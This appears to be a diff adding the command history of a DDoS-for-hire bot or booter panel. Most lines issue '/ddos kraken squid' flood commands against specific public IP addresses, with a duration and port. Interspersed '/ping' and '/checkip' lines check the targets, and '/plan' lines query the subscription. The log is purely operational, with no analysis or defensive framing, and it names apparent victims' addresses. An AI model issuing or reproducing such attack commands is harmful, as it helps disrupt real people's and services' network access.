@@ -1,0 +1,35 @@
+/plan
+/getplan
+/getplan
+/ddos kraken squid 97.85.139.51 120
+/ddos kraken squid 97.85.139.51 120
+/ddos kraken squid 97.85.139.51 120 80
+/ddos kraken squid 97.85.139.51 120 80
+/ddos kraken squid 97.85.139.51 120 80
+/ddos kraken squid 97.85.139.51 120 80
+/ping 97.85.139.51 120 80
+/ddos kraken squid 97.85.139.51 120 80
+/ddos kraken squid 172.58.4.124 120 80
+/ping 172.58.4.124
+/ddos kraken squid 172.58.4.124 120 80
+/ddos kraken squid  68.42.109.134 120 80
+/ddos kraken squid 69.201.78.224 120 80
+/ddos kraken squid 69.201.78.224 120 80
+/ddos kraken squid 75.161.46.203 120 80
+/ping 75.161.46.203
+/ddos kraken squid 75.161.46.203 120 80
+/ping 75.161.46.203
+/ddos kraken squid 75.161.46.203  120 80
+/ping 75.161.46.203
+/ddos kraken squid 75.161.46.203 120 80
+/ping 75.161.46.203
+/ddos kraken squid 70.112.195.155 120 80
+/ddos kraken squid 75.161.46.203 120 80
+/ping 75.161.46.203
+/plan
+/ddos kraken squid 72.239.203.173 120 80
+/ping 72.239.203.173
+/ddos kraken squid 72.239.203.173 120 80
+/ddos kraken squid 72.239.203.173 120 80
+/checkip 74.105.94.92
+/checkip 144.163.49.79
